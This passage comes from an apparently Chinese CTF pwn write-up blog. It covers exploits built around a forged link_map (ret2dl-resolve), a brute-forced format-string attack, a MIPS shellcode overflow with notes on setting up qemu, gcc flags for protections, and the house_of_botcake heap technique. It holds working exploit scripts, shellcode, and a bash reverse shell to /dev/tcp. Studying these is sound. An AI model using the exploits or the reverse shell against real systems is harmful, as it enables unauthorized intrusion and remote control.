class="number">0x2d0</span>)+p64(<span class="number">0x400A36</span>)+fake_link_map+p64(bss+<span class="number">64</span><span class="number">-8</span>)+ (pop_rdi)+p64(bss)+p64(pop_rsi_r15)+p64(bss)+p64(<span class="number">0</span>)+p64(decode)+p64(leave_ret)+<span class="string">"bash -c \"bash -i &gt;&amp; /dev/tcp/127.0.0.1/7777 0&lt;&amp;1\"\x00"</span></span><br><span class="line"></span><br><span class="line">payload=base64.b64encode(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure>

<p>在复现的时候主要感觉他这个fake_link的构造很玄学，然后在网上找了个板子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=<span class="string">'/bin/zsh'</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2-dl"</span>)</span><br><span class="line"></span><br><span class="line">bss = elf.bss()</span><br><span class="line">log.info(<span class="string">".bss :0x%X"</span>%bss)</span><br><span class="line">write_addr = bss+<span class="number">0xac0</span>    <span class="comment"># 这里要调试一下，rsp有可能落在非bss上</span></span><br><span class="line">rbp = write_addr<span class="number">-0x8</span></span><br><span class="line">fake_link_map_addr = write_addr+<span class="number">0x18</span></span><br><span class="line">vuln_addr = <span class="number">0x0000000000400687</span></span><br><span class="line">pop7ret = <span class="number">0x000000000040073a</span></span><br><span class="line">mov3call = <span class="number">0x0000000000400720</span></span><br><span class="line">plt_load = <span class="number">0x4004e6</span> <span class="comment"># jmp</span></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ELF64_sym_size = 0x18</span></span><br><span class="line"><span class="comment"># ELF64_Rela_size = 0x18</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct            </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    Elf64_Word    st_name;        /* Symbol name (string tbl index) */</span></span><br><span class="line"><span class="string">      unsigned char    st_info;    /* Symbol type and binding */        </span></span><br><span class="line"><span class="string">      unsigned char st_other;        /* Symbol visibility */              </span></span><br><span class="line"><span class="string">      Elf64_Section    st_shndx;    /* Section index */                  </span></span><br><span class="line"><span class="string">      Elf64_Addr    st_value;        /* Symbol value */                   </span></span><br><span class="line"><span class="string">      Elf64_Xword    st_size;        /* Symbol size */                    </span></span><br><span class="line"><span class="string">&#125;Elf64_Sym;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">typedef struct           </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  Elf64_Addr    r_offset;        /* Address */                         </span></span><br><span class="line"><span class="string">  Elf64_Xword    r_info;            /* Relocation type and symbol index */</span></span><br><span class="line"><span class="string">  Elf64_Sxword    r_addend;        /* Addend */                          </span></span><br><span class="line"><span class="string">&#125;Elf64_Rela;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">typedef struct          </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  Elf64_Sxword    d_tag;            /* Dynamic entry type */</span></span><br><span class="line"><span class="string">  union</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      Elf64_Xword d_val;        /* Integer value */</span></span><br><span class="line"><span class="string">      Elf64_Addr d_ptr;            /* Address value */</span></span><br><span class="line"><span class="string">    &#125; d_un;</span></span><br><span class="line"><span class="string">&#125;Elf64_Dyn;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_STR_addr = link_map +0x68  </span></span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_SYM_addr = link_map +0x70  </span></span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_JMPREL_addr = link_map +0xf8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_fake_link_map</span><span class="params">(fake_link_map_addr,l_addr,st_value)</span>:</span></span><br><span class="line">  <span class="comment"># 给出各个指针的假地址</span></span><br><span class="line">  fake_Elf64_Dyn_STR_addr = p64(fake_link_map_addr)</span><br><span class="line">  fake_Elf64_Dyn_SYM_addr = p64(fake_link_map_addr + <span class="number">0x8</span>)</span><br><span class="line">  fake_Elf64_Dyn_JMPREL_addr = p64(fake_link_map_addr + <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 伪造相关结构体</span></span><br><span class="line">  fake_Elf64_Dyn_SYM = flat(p64(<span class="number">0</span>),p64(st_value<span class="number">-8</span>))</span><br><span class="line">  fake_Elf64_Dyn_JMPREL = flat(p64(<span class="number">0</span>),p64(fake_link_map_addr+<span class="number">0x28</span>)  )<span class="comment"># JMPREL指向.rel.plt地址，放在fake_link_map_addr+0x28</span></span><br><span class="line">  r_offset = fake_link_map_addr - l_addr</span><br><span class="line">  log.info(<span class="string">"r_offset :"</span>+str(hex(r_offset)))</span><br><span class="line">  fake_Elf64_rela = flat(p64(r_offset),p64(<span class="number">7</span>),p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">  <span class="comment"># fake_link_map整体结构</span></span><br><span class="line">  fake_link_map = flat(   <span class="comment"># 0x0</span></span><br><span class="line">    p64(l_addr),          <span class="comment"># 0x8</span></span><br><span class="line">    fake_Elf64_Dyn_SYM,   <span class="comment"># 0x18</span></span><br><span class="line">    fake_Elf64_Dyn_JMPREL,<span class="comment"># 0x28</span></span><br><span class="line">    fake_Elf64_rela,      <span class="comment"># 0x40</span></span><br><span class="line">    <span class="string">"\x00"</span>*<span class="number">0x28</span>,         <span class="comment"># 0x68，下面开始放指针</span></span><br><span class="line">    fake_Elf64_Dyn_STR_addr,  <span class="comment"># STRTAB指针,0x70</span></span><br><span class="line">    fake_Elf64_Dyn_SYM_addr,  <span class="comment"># SYMTAB指针,0x78</span></span><br><span class="line">    <span class="string">"/bin/sh\x00"</span>.ljust(<span class="number">0x80</span>,<span class="string">"\x00"</span>),</span><br><span class="line">    fake_Elf64_Dyn_JMPREL_addr, <span class="comment"># JMPREL指针</span></span><br><span class="line">  )</span><br><span class="line">  <span class="keyword">return</span> fake_link_map</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l_addr = libc.sym[<span class="string">'system'</span>] - libc.sym[<span class="string">'__libc_start_main'</span>] <span class="comment"># l-&gt;l_addr设置为 system 与 __libc_start_main 的偏移值,此时__libc_start_main是一个已经解析过的函数</span></span><br><span class="line">log.info(<span class="string">"l_addr :"</span>+str(hex(l_addr)))</span><br><span class="line">log.info(<span class="string">"elf.got['__libc_start_main'] :"</span>+str(hex(elf.got[<span class="string">'__libc_start_main'</span>])))</span><br><span class="line">log.info(<span class="string">"plt_load :"</span>+str(hex(<span class="number">0x4004e6</span>)))</span><br><span class="line">log.info(<span class="string">"write_addr :"</span>+str(hex(write_addr)))</span><br><span class="line"><span class="comment">#l-&gt;l_addr + sym-&gt;st_value</span></span><br><span class="line"><span class="comment"># value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span></span><br><span class="line">st_value = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">fake_link_map = get_fake_link_map(fake_link_map_addr,l_addr,st_value)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ret2-dl"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 首先，利用栈迁移，把fake_link_map放在bss段上</span></span><br><span class="line">rop = flat( <span class="string">'a'</span>*<span class="number">0x70</span>,  <span class="comment"># 此时到达老rbp</span></span><br><span class="line">            p64(rbp),</span><br><span class="line">            p64(pop7ret),</span><br><span class="line">            p64(<span class="number">0</span>),</span><br><span class="line">            p64(<span class="number">1</span>),</span><br><span class="line">            p64(read_got),  <span class="comment"># 重新调用read函数  r12</span></span><br><span class="line">            p64(len(fake_link_map)+<span class="number">0x18</span>+<span class="number">0x10</span>),   <span class="comment"># read读入长度 </span></span><br><span class="line">            p64(write_addr),                  <span class="comment"># read读入位置  </span></span><br><span class="line">            p64(<span class="number">0</span>),                               <span class="comment"># </span></span><br><span class="line">            p64(mov3call),</span><br><span class="line">            p64(<span class="number">0</span>)*<span class="number">7</span> ,                        <span class="comment"># 补位</span></span><br><span class="line">            p64(vuln_addr)                       <span class="comment"># 再返回vuln函数</span></span><br><span class="line">)</span><br><span class="line">log.info(hex(len(fake_link_map)+<span class="number">0x18</span>+<span class="number">0x10</span>))</span><br><span class="line">io.sendline(rop)        <span class="comment"># 此rop中包含了ret2csu，利用其向bss上读数据</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 接下来，由于我们在rop中利用ret2csu调用了read函数，我们开始向bss上读数据，以下数据内容是由rop中ret2csu调用的read函数读取的。</span></span><br><span class="line">fake = flat(</span><br><span class="line">            p64(plt_load),</span><br><span class="line">            p64(fake_link_map_addr),</span><br><span class="line">            p64(<span class="number">0</span>),</span><br><span class="line">            fake_link_map      <span class="comment"># fake_link_map本体</span></span><br><span class="line">)</span><br><span class="line">log.info(hex(len(fake)))</span><br><span class="line">io.sendline(fake)</span><br><span class="line">attach(io)</span><br><span class="line">pause()</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400743</span></span><br><span class="line">leave = <span class="number">0x4006a6</span></span><br><span class="line">stack_mig = flat(</span><br><span class="line">            <span class="string">'a'</span>*<span class="number">0x70</span>,</span><br><span class="line">            p64(rbp),</span><br><span class="line">            p64(pop_rdi_ret),</span><br><span class="line">            p64(fake_link_map_addr+<span class="number">0x78</span>), <span class="comment"># /bin/sh</span></span><br><span class="line">            p64(leave)</span><br><span class="line">)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.sendline(stack_mig)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h2><p>单步执行到printf_positional函数ret返回的地方，观察此时的返回的lbc地址和一个onegadget很接近，大概率只需爆破一位就行，且此时的onegadget刚好满足触发条件</p>
<p>好思路</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):       </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=process(<span class="string">"./noleakfmt"</span>)</span><br><span class="line">        one=<span class="number">0x027a</span></span><br><span class="line">        p.recvuntil(<span class="string">" : "</span>)</span><br><span class="line">        stack=int(p.recv(<span class="number">14</span>),<span class="number">16</span>)<span class="number">-0x2d6c</span> </span><br><span class="line">        <span class="keyword">if</span>(stack&amp;<span class="number">0xffff</span>&gt;<span class="number">0x2000</span>):</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    p.sendline(<span class="string">"%"</span>+str(stack&amp;<span class="number">0xffff</span>)+<span class="string">"c"</span>+<span class="string">"%11$hn"</span>)</span><br><span class="line">    p.sendline(<span class="string">"%"</span>+str(one)+<span class="string">"c"</span>+<span class="string">"%37$hn"</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn题writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>mips pwn</title>
    <url>/year/09/23/cl7iordpi002p293fkufmdbk4/</url>
    <content><![CDATA[<p>记录下mips架构环境的搭建和利用</p>
<a id="more"></a>

<h2 id="0x0-mips基本知识"><a href="#0x0-mips基本知识" class="headerlink" title="0x0 mips基本知识"></a>0x0 mips基本知识</h2><ul>
<li><code>a0-a3</code>: 存储参数</li>
<li><code>fp</code>: <code>fram pointer</code>，用来恢复栈之类的操作，可以理解为和<code>ebp</code>差不多的作用</li>
<li><code>sp</code>: 存储栈地址</li>
<li><code>v0...</code>: 存储一些变量或地址</li>
<li><code>t8,t9</code>: 临时寄存器，<code>t9</code>常常用来调用函数。如<code>alarm</code>的<code>plt</code>调用如下</li>
</ul>
<h2 id="0x1-交叉编译环境"><a href="#0x1-交叉编译环境" class="headerlink" title="0x1 交叉编译环境"></a>0x1 交叉编译环境</h2><h3 id="大端"><a href="#大端" class="headerlink" title="大端"></a>大端</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install linux-libc-dev-mips-cross </span><br><span class="line">sudo apt-get install libc6-mips-cross libc6-dev-mips-cross </span><br><span class="line">sudo apt-get install binutils-mips-linux-gnu gcc-mips-linux-gnu </span><br><span class="line">sudo apt-get install g++-mips-linux-gnu</span><br></pre></td></tr></table></figure>

<h3 id="小端"><a href="#小端" class="headerlink" title="小端"></a>小端</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install linux-libc-dev-mipsel-cross</span><br><span class="line">sudo apt-get install libc6-mipsel-cross libc6-dev-mipsel-cross</span><br><span class="line">sudo apt-get install binutils-mipsel-linux-gnu gcc-mipsel-linux-gnu</span><br><span class="line">sudo apt-get install g++-mipsel-linux-gnu</span><br></pre></td></tr></table></figure>

<p>qemu有一个参数是是<code>-L</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-L path       QEMU_LD_PREFIX    set the elf interpreter prefix to &apos;path&apos;</span><br></pre></td></tr></table></figure>

<p>通过这个我们可以指定lib所在的位置，进入<code>/usr</code>可以看到mips库所在的位置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wood@ubuntu:~/pwn/mips/magicheap$ ls /usr/</span><br><span class="line">bin  games  include  lib  libexec  <span class="built_in">local</span>  locale  mipsel-linux-gnu  mips-linux-gnu  sbin  share  src</span><br></pre></td></tr></table></figure>

<p>假设我们手头有一个mips小端的程序，我们就可以通过以下参数启动它。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-mipsel -L /usr/mipsel-linux-gnu/ ./hello</span><br></pre></td></tr></table></figure>

<h2 id="pwn02-babystack"><a href="#pwn02-babystack" class="headerlink" title="pwn02_babystack"></a>pwn02_babystack</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>这里采用qemu的用户模式来创建一个虚拟机执行程序。</p>
<p>先把对应的libc库放置当前目录的一个lib文件夹中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir lib </span><br><span class="line">sudo mv libc.so.1 ./lib/</span><br><span class="line">sudo mv ld-uClibc.so.0 ./lib/</span><br></pre></td></tr></table></figure>

<p>启动虚拟机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-mipsel -L ./ ./main</span><br></pre></td></tr></table></figure>

<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-mipsel -L ./ ./main</span><br></pre></td></tr></table></figure>

<p>然后另开一个终端(用pwndbg调试起来比较友好)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-multiarch ./main</span><br><span class="line">gdb&gt; target remote localhost:1234</span><br></pre></td></tr></table></figure>

<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>很简单，就是一个栈溢出然后执行shellcode就好了</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">'mips'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#sh= process(["qemu-mipsel", "-g", "1234", "-L", "./lib","./main"])</span></span><br><span class="line">sh = remote(<span class="string">'111.231.70.44'</span>,<span class="number">28099</span>)</span><br><span class="line">context.arch=<span class="string">'mips'</span></span><br><span class="line">context.os=<span class="string">'linux'</span></span><br><span class="line">context.update(bits = <span class="number">32</span>, endian = <span class="string">'little'</span>)</span><br><span class="line">ret_addr = <span class="number">0x400860</span></span><br><span class="line">sh.recvuntil(<span class="string">'Now,Input Your Name:\n'</span>)</span><br><span class="line">shellcode =  <span class="string">""</span></span><br><span class="line">shellcode += <span class="string">"\x66\x06\x06\x24\xff\xff\xd0\x04\xff\xff\x06\x28\xe0"</span></span><br><span class="line">shellcode += <span class="string">"\xff\xbd\x27\x01\x10\xe4\x27\x1f\xf0\x84\x24\xe8\xff"</span></span><br><span class="line">shellcode += <span class="string">"\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x27\xab\x0f\x02"</span></span><br><span class="line">shellcode += <span class="string">"\x24\x0c\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x00"</span></span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line">sh.recvuntil(<span class="string">'Input Your message:\n'</span>)</span><br><span class="line">sh.sendline(<span class="string">'a'</span>*<span class="number">0x34</span> + p32(<span class="number">0x410C20</span>))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>异构</category>
      </categories>
      <tags>
        <tag>mips</tag>
      </tags>
  </entry>
  <entry>
    <title>出题时常用到的编译命令</title>
    <url>/year/09/15/cl7iordq9004q293f55iebb6s/</url>
    <content><![CDATA[<p>就是开保护关保护什么的编译选项</p>
<a id="more"></a>

<h3 id="Linux-alsr"><a href="#Linux-alsr" class="headerlink" title="Linux alsr"></a>Linux alsr</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sysctl -n kernel.randomize_va_space</span></span><br><span class="line"><span class="comment"># cat /proc/sys/kernel/randomize_va_space</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sysctl -w kernel.randomize_va_space=0</span></span><br><span class="line"><span class="comment"># echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br></pre></td></tr></table></figure>

<h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc -o <span class="built_in">test</span> test.c                // 默认不开启PIE</span><br><span class="line">$ gcc -fpie -pie -o <span class="built_in">test</span> test.c     // 开启PIE 强度为1</span><br><span class="line">$ gcc -fPIE -pie -o <span class="built_in">test</span> test.c     // 开启PIE 最高强度2</span><br><span class="line">$ gcc -fpic -o <span class="built_in">test</span> test.c          // 开启PIC 强度为1 不会开启PIE</span><br><span class="line">$ gcc -fPIC -o <span class="built_in">test</span> test.c          // 开启PIC 最高强度2 不会开启PIE</span><br><span class="line">$ gcc -no-pie -o <span class="built_in">test</span> test.c  		// 关闭pie</span><br></pre></td></tr></table></figure>

<h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc -o <span class="built_in">test</span> test.c                    // 默认开启 NX 保护</span><br><span class="line">$ gcc -z execstack -o <span class="built_in">test</span> test.c       // 禁用 NX 保护</span><br><span class="line">$ gcc -z noexecstack -o <span class="built_in">test</span> test.c     // 开启 NX 保护</span><br></pre></td></tr></table></figure>

<h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc -o <span class="built_in">test</span> test.c                        // 默认不开启 Canary 保护</span><br><span class="line">$ gcc -fno-stack-protector -o <span class="built_in">test</span> test.c   // 禁用栈保护</span><br><span class="line">$ gcc -fstack-protector -o <span class="built_in">test</span> test.c      // 启用堆栈保护，只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">$ gcc -fstack-protector-all -o <span class="built_in">test</span> test.c  // 启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>

<h3 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc -o <span class="built_in">test</span> test.c                          // 默认不会开启检查</span><br><span class="line">$ gcc -D_FORTIFY_SOURCE=1 -o <span class="built_in">test</span> test.c      // 较弱的检查</span><br><span class="line">$ gcc -D_FORTIFY_SOURCE=2 -o <span class="built_in">test</span> test.c      // 较强的检查</span><br></pre></td></tr></table></figure>

<h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c                     // 默认是 Partial RELRO</span><br><span class="line">gcc -z norelro -o <span class="built_in">test</span> test.c          // 关闭</span><br><span class="line">gcc -z lazy -o <span class="built_in">test</span> test.c             // 部分开启 即Partial RELRO</span><br><span class="line">gcc -z now -o <span class="built_in">test</span> test.c              // 全部开启</span><br></pre></td></tr></table></figure>

<h3 id="去符号名"><a href="#去符号名" class="headerlink" title="去符号名"></a>去符号名</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// gcc -o box box.c &amp;&amp; strip -s box</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>gcc</tag>
      </tags>
  </entry>
  <entry>
    <title>house_of_botcake &amp;&amp; fastbin_reverse_into_tcache</title>
    <url>/year/09/15/cl7iordpe002b293fo2adryef/</url>
    <content><![CDATA[<p>house_of_botcake 是针对2.29对double free做出限制以后提出的利用方法</p>
<p>fastbin_reverse_into_tcache 是利用fastbin实现一个类似于unsorted bin attack的效果</p>
<a id="more"></a>

<h2 id="0x01-house-of-botcake"><a href="#0x01-house-of-botcake" class="headerlink" title="0x01 house_of_botcake"></a>0x01 house_of_botcake</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"This file demonstrates a powerful tcache poisoning attack by tricking malloc into"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"returning a pointer to an arbitrary location (in this demo, the stack)."</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"This attack only relies on double free.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"The address we want malloc() to return, namely,"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"the target address is %p.\n\n"</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Preparing heap layout"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later."</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating a chunk for later consolidation"</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating the victim chunk."</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc(0x100): a=%p.\n"</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Allocating a padding to prevent consolidation.\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Now we are able to cause chunk overlapping"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 1: fill up tcache list"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 2: free the victim chunk so it will be added to unsorted bin"</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 3: free the previous chunk and make it consolidate with the victim chunk."</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// simple tcache poisoning</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Launch tcache poisoning"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk"</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"We simply overwrite victim's fwd pointer"</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Now we can cash out the target chunk."</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The new chunk is at %p\n"</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Got control on target/stack!\n\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// note</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Note:"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"In that case, once you have done this exploitation, you can have many arbitary writes very easily."</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先申请7个chunk，然后再申请出一个a和一个prev，我们最后会对这个a进行攻击。（注意先申请prev，再申请a，顺序不能乱）</p>
